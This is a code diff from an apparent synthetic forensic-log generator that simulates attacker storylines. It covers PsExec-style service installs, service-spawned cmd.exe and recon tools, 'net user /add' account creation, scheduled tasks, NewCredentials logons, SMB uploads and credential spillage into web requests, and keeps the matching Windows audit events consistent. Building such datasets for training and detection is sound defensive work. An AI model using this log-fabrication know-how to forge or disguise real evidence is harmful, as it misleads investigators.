+        service_file_name: str,
+        service_account: str,
+        time: datetime,
+        lifecycle_group_id: str = "",
+    ) -> None:
+        """Remember installed storyline services for later service-backed beacons."""
+        if not service_file_name:
+            return
+        if not hasattr(self, "_last_storyline_service_by_system"):
+            self._last_storyline_service_by_system: dict[str, dict[str, Any]] = {}
+        self._last_storyline_service_by_system[system.hostname] = {
+            "service_name": service_name,
+            "service_file_name": service_file_name,
+            "service_account": service_account,
+            "installed_at": time,
+            "lifecycle_group_id": lifecycle_group_id
+            or self._storyline_remote_service_lifecycle_id(system, service_name),
+        }
+
+    def _storyline_remote_service_lifecycle_id(
+        self,
+        system: System,
+        service_name: str,
+    ) -> str:
+        """Return the stable canonical lifecycle for one authored service action."""
+
+        dispatcher = getattr(self, "dispatcher", None)
+        cluster_id = getattr(dispatcher, "storyline_cluster_id", "") or getattr(
+            self,
+            "_current_storyline_spec_id",
+            "",
+        )
+        return stable_uuid(
+            "storyline-windows-remote-service",
+            cluster_id,
+            system.hostname,
+            service_name.casefold(),
+        )
+
+    @staticmethod
+    def _normalize_storyline_service_file_name(service_file_name: str) -> str:
+        """Return a Windows service image path in source-native expanded form."""
+        image = service_file_name.strip().strip('"')
+        replacements = {
+            "%SystemRoot%": r"C:\Windows",
+            "%systemroot%": r"C:\Windows",
+            r"\SystemRoot": r"C:\Windows",
+        }
+        for marker, replacement in replacements.items():
+            if image.startswith(marker):
+                image = replacement + image[len(marker) :]
+                break
+        return image.replace("/", "\\")
+
+    @staticmethod
+    def _service_account_user(service_account: str) -> User | None:
+        """Return a User model for service identities that can own process telemetry."""
+        normalized = service_account.strip().replace("/", "\\")
+        account_key = normalized.upper()
+        builtin_accounts = {
+            "LOCALSYSTEM": ("SYSTEM", "Local System"),
+            "LOCAL SYSTEM": ("SYSTEM", "Local System"),
+            "NT AUTHORITY\\SYSTEM": ("SYSTEM", "Local System"),
+            "SYSTEM": ("SYSTEM", "Local System"),
+            "LOCALSERVICE": ("LOCAL SERVICE", "Local Service"),
+            "LOCAL SERVICE": ("LOCAL SERVICE", "Local Service"),
+            "NT AUTHORITY\\LOCAL SERVICE": ("LOCAL SERVICE", "Local Service"),
+            "NETWORKSERVICE": ("NETWORK SERVICE", "Network Service"),
+            "NETWORK SERVICE": ("NETWORK SERVICE", "Network Service"),
+            "NT AUTHORITY\\NETWORK SERVICE": ("NETWORK SERVICE", "Network Service"),
+        }
+        account = builtin_accounts.get(account_key)
+        if account is not None:
+            username, full_name = account
+            return User(
+                username=username,
+                full_name=full_name,
+                email=f"{username.lower().replace(' ', '.')}@example.local",
+            )
+        return None
+
+    def _storyline_service_process_identity(
+        self,
+        *,
+        system: System,
+        time: datetime,
+        process_name: str,
+        future_specs: Iterable[Any],
+    ) -> tuple[User, str, str] | None:
+        """Resolve an authored service executable to its configured built-in identity."""
+
+        process_image = self._normalize_storyline_service_file_name(process_name)
+        process_exe = process_image.rsplit("\\", 1)[-1].casefold()
+        recent_service = getattr(self, "_last_storyline_service_by_system", {}).get(
+            system.hostname,
+            {},
+        )
+        installed_image = self._normalize_storyline_service_file_name(
+            str(recent_service.get("service_file_name") or "")
+        )
+        installed_at = recent_service.get("installed_at")
+        if (
+            installed_image.rsplit("\\", 1)[-1].casefold() == process_exe
+            and isinstance(installed_at, datetime)
+            and installed_at <= time
+            and time - installed_at <= timedelta(minutes=30)
+        ):
+            service_user = self._service_account_user(
+                str(recent_service.get("service_account") or "")
+            )
+            if service_user is not None:
+                return (
+                    service_user,
+                    str(recent_service.get("service_name") or process_exe),
+                    str(recent_service.get("lifecycle_group_id") or ""),
+                )
+
+        matching_service_spec = next(
+            (
+                candidate
+                for candidate in future_specs
+                if getattr(candidate, "type", "") == "service_installed"
+                and self._normalize_storyline_service_file_name(
+                    str(getattr(candidate, "service_file_name", "") or "")
+                )
+                .rsplit("\\", 1)[-1]
+                .casefold()
+                == process_exe
+            ),
+            None,
+        )
+        if matching_service_spec is None:
+            return None
+        service_user = self._service_account_user(
+            str(getattr(matching_service_spec, "service_account", "") or "")
+        )
+        if service_user is None:
+            return None
+        service_name = str(getattr(matching_service_spec, "service_name", "") or process_exe)
+        return (
+            service_user,
+            service_name,
+            self._storyline_remote_service_lifecycle_id(system, service_name),
+        )
+
+    def _storyline_service_context_for_process(
+        self,
+        actor: User,
+        system: System,
+        time: datetime,
+        process_name: str,
+    ) -> tuple[User, str, int, str] | None:
+        """Return service identity/logon/parent PID for recent service-backed commands."""
+        if _get_os_category(system.os) != "windows":
+            return None
+        services = getattr(self, "_last_storyline_service_by_system", {})
+        service = services.get(system.hostname)
+        if not service:
+            return None
+
+        service_file_name = str(service.get("service_file_name") or "")
+        if not service_file_name:
+            return None
+        service_image = self._normalize_storyline_service_file_name(service_file_name)
+        service_exe = service_image.rsplit("\\", 1)[-1].lower()
+        if service_exe not in {"psexesvc.exe", "healthmonitorsvc.exe"}:
+            return None
+        installed_at = service.get("installed_at")
+        if isinstance(installed_at, datetime):
+            context_window = (
+                timedelta(minutes=2) if service_exe == "psexesvc.exe" else timedelta(minutes=30)
+            )
+            if time < installed_at or time - installed_at > context_window:
+                return None
+
+        process_exe = process_name.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
+        if process_exe == service_exe:
+            return None
+        service_child_exes = {
+            "cmd.exe",
+            "powershell.exe",
+            "pwsh.exe",
+            "net.exe",
+            "net1.exe",
+            "whoami.exe",
+            "hostname.exe",
+            "ipconfig.exe",
+            "nltest.exe",
+            "klist.exe",
+            "sc.exe",
+            "wevtutil.exe",
+            "wmic.exe",
+            "certutil.exe",
+        }
+        if process_exe not in service_child_exes:
+            return None
+
+        service_user = self._service_account_user(str(service.get("service_account") or ""))
+        if service_user is None:
+            return None
+
+        service_pid, _service_image = self._ensure_storyline_service_process_for_beacon(
+            actor=service_user,
+            system=system,
+            time=time,
+        )
+        if service_pid <= 0:
+            return None
+        return (
+            service_user,
+            "0x3e7",
+            service_pid,
+            str(service.get("lifecycle_group_id") or ""),
+        )
+
+    def _linux_native_service_user_for_storyline_actor(
+        self,
+        actor: User,
+        system: System,
+        time: datetime,
+    ) -> User:
+        """Return the OS-native Linux service user for web-service storyline actors."""
+        if _get_os_category(system.os) != "linux":
+            return actor
+        if actor.username.lower() not in {"apache", "www-data", "nginx", "httpd", "tomcat"}:
+            return actor
+
+        raw_system_pids = getattr(self.activity_generator, "_system_pids", {})
+        if not isinstance(raw_system_pids, dict):
+            return actor
+        system_pids = raw_system_pids.get(
+            system.hostname,
+            {},
+        )
+        if not isinstance(system_pids, dict):
+            return actor
+        for key in ("apache2", "httpd", "nginx", "php-fpm"):
+            pid = int(system_pids.get(key, 0) or 0)
+            if pid <= 0:
+                continue
+            proc = self.state_manager.get_process(system.hostname, pid)
+            if proc is None or not proc.username:
+                continue
+            if isinstance(proc.start_time, datetime) and proc.start_time > time:
+                continue
+            native_username = proc.username
+            if native_username == actor.username:
+                return actor
+            return User(
+                username=native_username,
+                full_name=f"{native_username} service",
+                email=f"{native_username}@example.local",
+                groups=list(actor.groups),
+                enabled=actor.enabled,
+                persona=actor.persona,
+                primary_system=actor.primary_system,
+            )
+        return actor
+
+    @staticmethod
+    def _process_has_following_same_host_connection(
+        system: System,
+        future_specs: Iterable[Any],
+    ) -> bool:
+        """Return whether a just-created process owns a later same-host connection."""
+        for future in future_specs:
+            future_type = getattr(future, "type", "")
+            if future_type == "connection":
+                source_ip = getattr(future, "source_ip", None) or system.ip
+                if source_ip == system.ip:
+                    return True
+                continue
+            if future_type in {"process", "logoff", "logon", "ssh_session"}:
+                return False
+        return False
+
+    @staticmethod
+    def _scheduled_task_lookup_key(system: System, task_name: str) -> tuple[str, str]:
+        """Return a normalized host/task key for correlating schtasks with 4698."""
+        normalized_task = task_name.strip().strip('"').replace("/", "\\")
+        if not normalized_task.startswith("\\"):
+            normalized_task = f"\\{normalized_task}"
+        return system.hostname, normalized_task.lower()
+
+    def _record_storyline_scheduled_task_command(
+        self,
+        system: System,
+        task_name: str,
+        command_line: str,
+    ) -> None:
+        """Remember a schtasks.exe command so the later 4698 XML matches it."""
+        if not task_name or not command_line:
+            return
+        if not hasattr(self, "_storyline_scheduled_task_commands"):
+            self._storyline_scheduled_task_commands: dict[tuple[str, str], str] = {}
+        self._storyline_scheduled_task_commands[
+            self._scheduled_task_lookup_key(system, task_name)
+        ] = command_line
+
+    def _recent_storyline_scheduled_task_command(
+        self,
+        system: System,
+        task_name: str,
+    ) -> str:
+        """Return the most recent schtasks.exe command for a host/task pair."""
+        commands = getattr(self, "_storyline_scheduled_task_commands", {})
+        return commands.get(self._scheduled_task_lookup_key(system, task_name), "")
+
+    @staticmethod
+    def _account_create_lookup_key(system: System, username: str) -> tuple[str, str]:
+        """Return a normalized lookup key for account-creation command metadata."""
+        return (system.hostname.lower(), username.strip().strip('"').lower())
+
+    def _record_storyline_account_create_command(
+        self,
+        system: System,
+        command_line: str,
+    ) -> None:
+        """Remember password-bearing net user /add commands for explicit 4720 events."""
+        match = _NET_USER_ADD_WITH_PASSWORD_RE.search(command_line)
+        if match is None:
+            return
+        if not hasattr(self, "_storyline_account_create_commands"):
+            self._storyline_account_create_commands: dict[tuple[str, str], str] = {}
+        self._storyline_account_create_commands[
+            self._account_create_lookup_key(system, match.group("username"))
+        ] = command_line
+
+    def _recent_storyline_account_create_command(
+        self,
+        system: System,
+        username: str,
+    ) -> str:
+        """Return the recent net user /add command for an explicit account-created event."""
+        commands = getattr(self, "_storyline_account_create_commands", {})
+        return commands.get(self._account_create_lookup_key(system, username), "")
+
+    @staticmethod
+    def _storyline_host_actor_key(system: System, actor: User) -> tuple[str, str]:
+        """Return the host/actor key used for in-step action readiness."""
+        return (system.hostname, actor.username.strip().lower())
+
+    def _record_storyline_host_available_after(
+        self,
+        *,
+        system: System,
+        actor: User,
+        time: datetime,
+        rng: random.Random,
+    ) -> None:
+        """Delay later same-host commands until a prior audit effect is visible."""
+        if not hasattr(self, "_storyline_host_available_at"):
+            self._storyline_host_available_at: dict[tuple[str, str], datetime] = {}
+        delay = timedelta(milliseconds=rng.randint(180, 950))
+        key = self._storyline_host_actor_key(system, actor)
+        available_at = time + delay
+        self._storyline_host_available_at[key] = max(
+            available_at,
+            self._storyline_host_available_at.get(key, available_at),
+        )
+
+    def _record_storyline_session_ready(
+        self,
+        *,
+        system: System,
+        actor: User,
+        session: Any,
+        rng: random.Random,
+    ) -> None:
+        """Delay follow-on same-host commands until a remote session is usable."""
+        ready_time = getattr(session, "source_ready_time", None) or getattr(
+            session,
+            "start_time",
+            None,
+        )
+        if isinstance(ready_time, datetime):
+            self._record_storyline_host_available_after(
+                system=system,
+                actor=actor,
+                time=ready_time,
+                rng=rng,
+            )
+
+    def _emit_storyline_account_password_followups(
+        self,
+        actor: User,
+        system: System,
+        time: datetime,
+        target_username: str,
+        target_sid: str,
+    ) -> None:
+        """Emit password and account-attribute follow-ups for net user password adds."""
+        from evidenceforge.generation.activity.timing_profiles import get_timing_window
+
+        reset_window = get_timing_window(
+            "windows.account_password_reset_from_add",
+            default_min_ms=950,
+            default_max_ms=1800,
+            default_position="after",
+        )
+        change_window = get_timing_window(
+            "windows.account_attributes_from_add",
+            default_min_ms=1850,
+            default_max_ms=3200,
+            default_position="after",
+        )
+        rng = random.Random(
+            _stable_seed(
+                f"storyline_account_followups:{system.hostname}:"
+                f"{target_username}:{time.isoformat()}"
+            )
+        )
+        reset_time = time + timedelta(
+            milliseconds=rng.randint(reset_window.min_ms, reset_window.max_ms)
+        )
+        change_time = time + timedelta(
+            milliseconds=rng.randint(change_window.min_ms, change_window.max_ms)
+        )
+        self.activity_generator.generate_password_reset(
+            actor=actor,
+            system=system,
+            time=reset_time,
+            target_username=target_username,
+            target_sid=target_sid,
+        )
+        self.activity_generator.generate_account_changed(
+            actor=actor,
+            system=system,
+            time=change_time,
+            target_username=target_username,
+            target_sid=target_sid,
+            password_last_set_to_event_time=True,
+            old_uac_value="0x15",
+            new_uac_value="0x10",
+            user_account_control="\n\t\t\t%%2081",
+            primary_group_id="-",
+        )
+
+    @staticmethod
+    def _service_lookup_key(system: System, service_name: str) -> tuple[str, str]:
+        """Return a normalized lookup key for host-local service metadata."""
+        return (system.hostname.lower(), service_name.lower())
+
+    def _record_storyline_service_create_command(
+        self,
+        system: System,
+        command_line: str,
+    ) -> None:
+        """Remember an sc.exe create command so the later 4697 fields match it."""
+        parsed = process_helpers._extract_sc_create_service_start_type(command_line)
+        if parsed is None:
+            return
+        service_name, service_start_type = parsed
+        if not hasattr(self, "_storyline_service_start_types"):
+            self._storyline_service_start_types: dict[tuple[str, str], str] = {}
+        self._storyline_service_start_types[self._service_lookup_key(system, service_name)] = (
+            service_start_type
+        )
+
+    def _recent_storyline_service_start_type(
+        self,
+        system: System,
+        service_name: str,
+    ) -> str:
+        """Return a service start type inferred from a preceding sc.exe command."""
+        start_types = getattr(self, "_storyline_service_start_types", {})
+        return start_types.get(self._service_lookup_key(system, service_name), "3")
+
+    def _ensure_storyline_service_process_for_beacon(
+        self,
+        actor: User,
+        system: System | None,
+        time: datetime,
+    ) -> tuple[int, str | None]:
+        """Create or reuse a storyline service process to own service-backed beacons."""
+        if system is None or _get_os_category(system.os) != "windows":
+            return -1, None
+        services = getattr(self, "_last_storyline_service_by_system", {})
+        service = services.get(system.hostname)
+        if not service:
+            return -1, None
+        service_file_name = str(service.get("service_file_name") or "")
+        if not service_file_name:
+            return -1, None
+        service_file_name = self._normalize_storyline_service_file_name(service_file_name)
+
+        image_lower = service_file_name.lower()
+        service_exe = service_file_name.rsplit("\\", 1)[-1].lower()
+        running = [
+            proc
+            for proc in self.state_manager.get_processes_on_system(system.hostname)
+            if proc.image.lower() == image_lower
+            and proc.start_time is not None
+            and proc.start_time <= time
+            and (service_exe != "psexesvc.exe" or time - proc.start_time <= timedelta(minutes=2))
+        ]
+        if running:
+            proc = max(running, key=lambda candidate: candidate.start_time)
+            self.activity_generator._record_user_process(system, actor, proc.pid, proc.image)
+            self._record_last_storyline_process(system, proc.pid, proc.image)
+            return proc.pid, proc.image
+
+        installed_at = service.get("installed_at")
+        process_time = time - timedelta(seconds=45)
+        if isinstance(installed_at, datetime):
+            process_time = max(process_time, installed_at + timedelta(seconds=1))
+        if service_exe == "psexesvc.exe":
+            start_lead_ms = 500 + (
+                _stable_seed(f"storyline_psexesvc_start:{system.hostname}:{time.isoformat()}")
+                % 2500
+            )
+            process_time = time - timedelta(milliseconds=start_lead_ms)
+            if isinstance(installed_at, datetime):
+                process_time = max(process_time, installed_at + timedelta(seconds=1))
+        if process_time >= time:
+            process_time = time - timedelta(milliseconds=100)
+
+        parent_pid = self.activity_generator._get_system_pid(system.hostname, "services", 0x2BC)
+        pid = self.activity_generator.generate_process(
+            user=actor,
+            system=system,
+            time=process_time,
+            logon_id="0x3e7",
+            process_name=service_file_name,
+            command_line=service_file_name,
+            parent_pid=parent_pid,
+            ensure_file_event=False,
+            from_storyline=True,
+            suppress_command_file_effect=True,
+            lifecycle_group_id=str(service.get("lifecycle_group_id") or ""),
+        )
+        self.activity_generator._record_user_process(system, actor, pid, service_file_name)
+        self._record_last_storyline_process(system, pid, service_file_name)
+        if service_exe == "psexesvc.exe":
+            ttl_ms = 8000 + (
+                _stable_seed(f"storyline_psexesvc_ttl:{system.hostname}:{pid}:{time.isoformat()}")
+                % 37000
+            )
+            self._queue_story_process_termination(
+                actor=actor,
+                system=system,
+                time=time + timedelta(milliseconds=ttl_ms),
+                pid=pid,
+                process_name=service_file_name,
+                logon_id="0x3e7",
+            )
+        return pid, service_file_name
+
+    def _record_storyline_logon(
+        self,
+        actor: User,
+        system: System,
+        logon_id: str,
+        source_ip: str | None = None,
+    ) -> None:
+        """Record a storyline-created session and bind any planned explicit close."""
+        self._ensure_storyline_session_end_pairs()
+        key = (actor.username, system.hostname)
+        registry = getattr(self, "_storyline_logon_registry", None)
+        if registry is None:
+            registry = self._storyline_logon_registry = {}
+        ordered_logons = registry.setdefault(key, [])
+        if logon_id not in ordered_logons:
+            ordered_logons.append(logon_id)
+
+        if not hasattr(self, "_last_storyline_logon_by_actor_system"):
+            self._last_storyline_logon_by_actor_system: dict[tuple[str, str], str] = {}
+        self._last_storyline_logon_by_actor_system[key] = logon_id
+        if source_ip is None and hasattr(self, "state_manager"):
+            get_session = getattr(self.state_manager, "get_session", None)
+            if callable(get_session):
+                session = get_session(logon_id)
+                source_ip = getattr(session, "source_ip", "") if session is not None else None
+        if source_ip:
+            if not hasattr(self, "_last_storyline_logon_source_by_actor_system"):
+                self._last_storyline_logon_source_by_actor_system: dict[tuple[str, str], str] = {}
+            self._last_storyline_logon_source_by_actor_system[key] = source_ip
+            if not hasattr(self, "_storyline_logon_source_by_id"):
+                self._storyline_logon_source_by_id: dict[str, str] = {}
+            self._storyline_logon_source_by_id[logon_id] = source_ip
+
+        spec_id = getattr(self, "_current_storyline_spec_id", "")
+        logoff_id = getattr(self, "_storyline_start_to_logoff", {}).get(spec_id)
+        if logoff_id:
+            plan = self._storyline_session_end_plans[logoff_id]
+            if not self.state_manager.plan_session_end(logon_id, plan):
+                raise StateError(
+                    f"Cannot bind explicit storyline close {logoff_id} to missing session "
+                    f"{logon_id}"
+                )
+            self._storyline_logoff_to_logon[logoff_id] = logon_id
+
+    def _storyline_new_credentials_caller(
+        self,
+        actor: User,
+        system: System,
+        time: datetime,
+    ) -> tuple[User, str]:
+        """Resolve a Type 9 local caller without manufacturing a desktop session."""
+
+        caller_session = self.activity_generator._active_interactive_windows_session(system, time)
+        if caller_session is None:
+            assigned_user = getattr(system, "assigned_user", "")
+            raise StateError(
+                "Storyline logon_type 9 requires an active local desktop caller on "
+                f"{system.hostname}; assigned_user={assigned_user or '-'} has no active "
+                "Type 2, 10, or 11 session before the event"
+            )
+        scenario_users = {
+            candidate.username: candidate for candidate in self.scenario.environment.users
+        }
+        caller = scenario_users.get(caller_session.username)
+        if caller is None:
+            raise StateError(
+                "Storyline logon_type 9 resolved local caller "
+                f"{caller_session.username!r} on {system.hostname}, but that caller is not "
+                "declared in environment.users"
+            )
+        if caller.username == actor.username:
+            raise StateError(
+                "Storyline logon_type 9 requires a distinct outbound credential identity; "
+                f"event actor {actor.username!r} is also the active local caller on "
+                f"{system.hostname}"
+            )
+        return caller, caller_session.logon_id
+
+    def _last_storyline_logon_for_actor_system(
+        self,
+        actor: User,
+        system: System,
+        at_time: datetime | None = None,
+    ) -> str | None:
+        """Return the latest storyline-created active LogonID for this actor/host."""
+        key = (actor.username, system.hostname)
+        registry = getattr(self, "_storyline_logon_registry", {})
+        ordered = registry.get(key)
+        if ordered is None:
+            latest = getattr(self, "_last_storyline_logon_by_actor_system", {}).get(key)
+            ordered = [latest] if latest else []
+        valid_ids = None
+        if at_time is not None:
+            valid_ids = {
+                session.logon_id
+                for session in self.state_manager.get_sessions_for_user_at(actor.username, at_time)
+                if session.system == system.hostname
+            }
+        for logon_id in reversed(ordered):
+            session = self.state_manager.get_session(logon_id)
+            if (
+                valid_ids is not None
+                and logon_id not in valid_ids
+                and (session is None or session.logon_type != 9)
+            ):
+                continue
+            if session is not None and session.system == system.hostname:
+                return logon_id
+        return None
+
+    def _storyline_smb_actor_and_spec(
+        self,
+        actor: User,
+        system: System,
+        time: datetime,
+        spec: Any,
+    ) -> tuple[User, Any]:
+        """Separate a Type 9 local token from its outbound SMB credential."""
+
+        logon_id = self._last_storyline_logon_for_actor_system(actor, system, at_time=time)
+        session = self.state_manager.get_session(logon_id) if logon_id is not None else None
+        if (
+            session is None
+            or session.logon_type != 9
+            or session.username.casefold() == actor.username.casefold()
+        ):
+            return actor, spec
+        users = {
+            candidate.username.casefold(): candidate
+            for candidate in self.scenario.environment.users
+        }
+        local_actor = users.get(session.username.casefold())
+        if local_actor is None:
+            raise StateError(
+                "Storyline SMB activity resolved Type 9 local caller "
+                f"{session.username!r} on {system.hostname}, but that caller is not declared "
+                "in environment.users"
+            )
+        smb_principal = spec.smb_principal or actor.username
+        return local_actor, spec.model_copy(update={"smb_principal": smb_principal})
+
+    @staticmethod
+    def _storyline_local_file_key(system: System, path: str) -> tuple[str, str]:
+        """Return one platform-aware key for a storyline-local file placement."""
+
+        normalized = path.replace("/", "\\") if _get_os_category(system.os) == "windows" else path
+        if _get_os_category(system.os) == "windows":
+            normalized = normalized.casefold()
+        return system.hostname.casefold(), normalized
+
+    def _remember_storyline_file_available(
+        self,
+        *,
+        system: System,
+        path: str,
+        available_at: datetime,
+        source_file: CompiledStorageFile | None = None,
+    ) -> None:
+        """Record when a canonical transfer first makes a local path consumable."""
+
+        if not hasattr(self, "_storyline_file_available_at"):
+            self._storyline_file_available_at: dict[tuple[str, str], datetime] = {}
+        key = self._storyline_local_file_key(system, path)
+        current = self._storyline_file_available_at.get(key)
+        if current is None or available_at < current:
+            self._storyline_file_available_at[key] = ensure_utc(available_at)
+        if source_file is not None:
+            if not hasattr(self, "_storyline_file_source_overrides"):
+                self._storyline_file_source_overrides: dict[
+                    tuple[str, str], CompiledStorageFile
+                ] = {}
+            self._storyline_file_source_overrides[key] = source_file
+
+    def _storyline_smb_source_override(
+        self,
+        *,
+        system: System,
+        spec: Any,
+    ) -> CompiledStorageFile | None:
+        """Return exact retained local-file truth for a dependent SMB upload."""
+
+        source = getattr(spec, "source", None)
+        if not isinstance(source, SmbClientLocation) or not source.path:
+            return None
+        return getattr(self, "_storyline_file_source_overrides", {}).get(
+            self._storyline_local_file_key(system, source.path)
+        )
+
+    def _storyline_smb_file_ready_time(
+        self,
+        *,
+        system: System,
+        spec: Any,
+        requested_at: datetime,
+        rng: random.Random,
+    ) -> datetime:
+        """Delay a local-file SMB upload until its canonical source exists."""
+
+        source = getattr(spec, "source", None)
+        if not isinstance(source, SmbClientLocation) or not source.path:
+            return requested_at
+        available_at = getattr(self, "_storyline_file_available_at", {}).get(
+            self._storyline_local_file_key(system, source.path)
+        )
+        if available_at is None or requested_at > available_at:
+            return requested_at
+        return available_at + timedelta(milliseconds=rng.randint(1_200, 2_000))
+
+    def _storyline_local_process_actor_for_logon(
+        self,
+        actor: User,
+        system: System,
+        logon_id: str,
+    ) -> User:
+        """Return the immutable local token owner for a Windows process session."""
+
+        session = self.state_manager.get_session(logon_id)
+        if (
+            _get_os_category(system.os) != "windows"
+            or session is None
+            or session.logon_type != 9
+            or session.username.casefold() == actor.username.casefold()
+        ):
+            return actor
+        users = {
+            candidate.username.casefold(): candidate
+            for candidate in self.scenario.environment.users
+        }
+        local_actor = users.get(session.username.casefold())
+        if local_actor is None:
+            raise StateError(
+                "NewCredentials process ownership requires declared local caller "
+                f"{session.username!r} on {system.hostname}"
+            )
+        return local_actor
+
+    def _ensure_storyline_session_end_pairs(self) -> None:
+        """Pair explicit logoffs with the latest preceding durable session intent."""
+        if hasattr(self, "_storyline_start_to_logoff"):
+            return
+        pending: dict[tuple[str, str], list[str]] = {}
+        start_to_logoff: dict[str, str] = {}
+        logoff_plans: dict[str, SessionEndPlan] = {}
+        scenario = getattr(self, "scenario", None)
+        for storyline_event in getattr(scenario, "storyline", []):
+            if not all(
+                hasattr(storyline_event, field)
+                for field in ("actor", "system", "id", "time", "events")
+            ):
+                continue
+            key = (storyline_event.actor, storyline_event.system)
+            for spec_index, spec in enumerate(storyline_event.events):
+                spec_id = f"{storyline_event.id}:{spec_index}"
+                if spec.type in {"ssh_session", "rdp_session", "logon"}:
+                    pending.setdefault(key, []).append(spec_id)
+                elif spec.type == "logoff" and pending.get(key):
+                    start_id = pending[key].pop()
+                    start_to_logoff[start_id] = spec_id
+                    end_time = self._parse_storyline_time(storyline_event.time)
+                    if end_time.tzinfo is None:
+                        end_time = end_time.replace(tzinfo=UTC)
+                    logoff_plans[spec_id] = SessionEndPlan(
+                        canonical_end=end_time.astimezone(UTC),
+                        authority="explicit_storyline",
+                        storyline_event_id=storyline_event.id,
+                    )
+        self._storyline_start_to_logoff = start_to_logoff
+        self._storyline_session_end_plans = logoff_plans
+        self._storyline_logoff_to_logon: dict[str, str] = {}
+
+    def _session_end_plan_for_current_start(self) -> SessionEndPlan | None:
+        """Return the explicit end paired with the current session-start spec."""
+        self._ensure_storyline_session_end_pairs()
+        spec_id = getattr(self, "_current_storyline_spec_id", "")
+        logoff_id = self._storyline_start_to_logoff.get(spec_id)
+        return self._storyline_session_end_plans.get(logoff_id or "")
+
+    def _authored_rdp_session_end_plan(self) -> SessionEndPlan | None:
+        """Return the explicit RDP end or one action-owned scenario fence."""
+
+        explicit = self._session_end_plan_for_current_start()
+        if explicit is not None:
+            return explicit
+        scenario_end = getattr(self, "end_time", None)
+        if not isinstance(scenario_end, datetime):
+            return None
+        return SessionEndPlan(
+            canonical_end=ensure_utc(scenario_end),
+            authority="action_bundle",
+        )
+
+    def _session_end_plan_for_current_logoff(self) -> tuple[str, SessionEndPlan] | None:
+        """Return the exact session and close plan paired with the current logoff."""
+        self._ensure_storyline_session_end_pairs()
+        spec_id = getattr(self, "_current_storyline_spec_id", "")
+        plan = self._storyline_session_end_plans.get(spec_id)
+        logon_id = self._storyline_logoff_to_logon.get(spec_id)
+        if plan is None or logon_id is None:
+            return None
+        return logon_id, plan
+
+    def _resolve_storyline_process_logon_id(
+        self,
+        actor: User,
+        system: System,
+        time: datetime,
+        rng: random.Random,
+    ) -> str:
+        """Resolve process session ownership for typed events and command spills."""
+        if not hasattr(self, "world_planner"):
+            sessions = self.state_manager.get_sessions_for_user(actor.username)
+            target_session = max(
+                (s for s in sessions if s.system == system.hostname),
+                key=lambda session: session.start_time,
+                default=None,
+            )
+            if target_session is not None:
+                return target_session.logon_id
+            logon_time = time - timedelta(seconds=rng.uniform(0.5, 2.0))
+            logon_id = self.activity_generator.generate_logon(
+                actor, system, logon_time, logon_type=3
+            )
+            self._record_storyline_logon(actor, system, logon_id)
+            return logon_id
+
+        from evidenceforge.validation.schema import BUILTIN_ACCOUNTS
+
+        os_category = _get_os_category(system.os)
+        service_accounts = set(self.scenario.environment.service_accounts)
+        is_local_account = actor.username in BUILTIN_ACCOUNTS or actor.username in service_accounts
+        is_interactive_linux_root = os_category == "linux" and actor.username == "root"
+        if is_local_account and not is_interactive_linux_root:
+            linux_daemon_users = {"apache", "www-data", "nginx", "httpd", "tomcat"}
+            if os_category == "linux" and actor.username.lower() in linux_daemon_users:
+                return ""
+            sessions = self.state_manager.get_sessions_for_user_at(actor.username, time)
+            target_session = max(
+                (s for s in sessions if s.system == system.hostname),
+                key=lambda session: session.start_time,
+                default=None,
+            )
+            if target_session is not None:
+                return target_session.logon_id
+            logon_time = time - timedelta(seconds=rng.uniform(0.5, 2.0))
+            return self.activity_generator.generate_service_logon(
+                system=system,
+                time=logon_time,
+                service_account=actor.username,
+            )
+
+        logon_id = self._last_storyline_logon_for_actor_system(actor, system, at_time=time)
+        if logon_id is not None:
+            return logon_id
+
+        required_until = self._next_storyline_logoff_time_for_actor_system(actor, system, time)
+        session_kind = self._storyline_non_session_kind(actor, system, rng)
+        target_session = self.world_planner.ensure_user_session(
+            actor,
+            system,
+            time,
+            rng,
+            session_kind=session_kind,
+            storyline_protected=True,
+            required_until=required_until,
+        )
+        self._record_storyline_logon(actor, system, target_session.logon_id)
+        return target_session.logon_id
+
+    def _resolve_storyline_process_spill_logon_id(
+        self,
+        actor: User,
+        system: System,
+        time: datetime,
+        rng: random.Random,
+    ) -> str:
+        """Forward the existing spill entrypoint to shared session resolution."""
+        return self._resolve_storyline_process_logon_id(actor, system, time, rng)
+
+    def _storyline_non_session_kind(
+        self,
+        actor: User,
+        system: System,
+        rng: random.Random,
+    ) -> str:
+        """Keep non-session authored activity from implicitly creating RDP."""
+
+        plan = self.world_model.plan_session(
+            user=actor,
+            target_system=system,
+            rng=rng,
+        )
+        if _get_os_category(system.os) == "windows" and plan.session_kind == "rdp":
+            return "interactive"
+        return plan.session_kind
+
+    def _select_web_server_for_spillage(
+        self, actor_system: System, requested_scheme: str | None
+    ) -> tuple[System | None, str | None]:
+        """Pick the destination web server for an http_* spillage surface.
+
+        The credential rides in an outbound request from the actor's host and is
+        recorded by the destination web server's access log, so a web_server-role
+        host must exist. Prefer a server other than the actor's own host (a real
+        outbound request), deterministic by hostname; fall back to the actor's
+        host only if it is the sole compatible web server. Returns None when
+        there is none (the validator flags this before generation).
+        """
+        from evidenceforge.generation.spillage import choose_web_spillage_scheme
+
+        candidates = [
+            (system, scheme)
+            for system in self.scenario.environment.systems
+            if (scheme := choose_web_spillage_scheme(system, requested_scheme)) is not None
+        ]
+        if not candidates:
+            return None, None
+        others = [
+            (system, scheme)
+            for system, scheme in candidates
+            if system.hostname != actor_system.hostname
+        ]
+        pool = others or candidates
+        if requested_scheme is None:
+            https_pool = [(system, scheme) for system, scheme in pool if scheme == "https"]
+            if https_pool:
+                pool = https_pool
+        return sorted(pool, key=lambda candidate: candidate[0].hostname)[0]
+
+    def _last_storyline_logon_source_for_actor_system(
+        self,
+        actor: User,
+        system: System,
+        at_time: datetime | None = None,
+    ) -> str | None:
+        """Return the latest storyline network-logon source for this actor/host."""
+        logon_id = self._last_storyline_logon_for_actor_system(actor, system, at_time=at_time)
+        if logon_id is None:
+            return None
+        by_logon = getattr(self, "_storyline_logon_source_by_id", {})
+        if logon_id in by_logon:
+            return by_logon[logon_id]
+        sources = getattr(self, "_last_storyline_logon_source_by_actor_system", {})
+        return sources.get((actor.username, system.hostname))
+
+    def _next_storyline_logoff_time_for_actor_system(
+        self,
+        actor: User,
+        system: System,
+        after_time: datetime,
+    ) -> datetime | None:
+        """Return the next planned storyline logoff for this actor and host."""
+        future_logoffs: list[datetime] = []
+        after_time = after_time.replace(tzinfo=UTC) if after_time.tzinfo is None else after_time
+        after_time = after_time.astimezone(UTC)
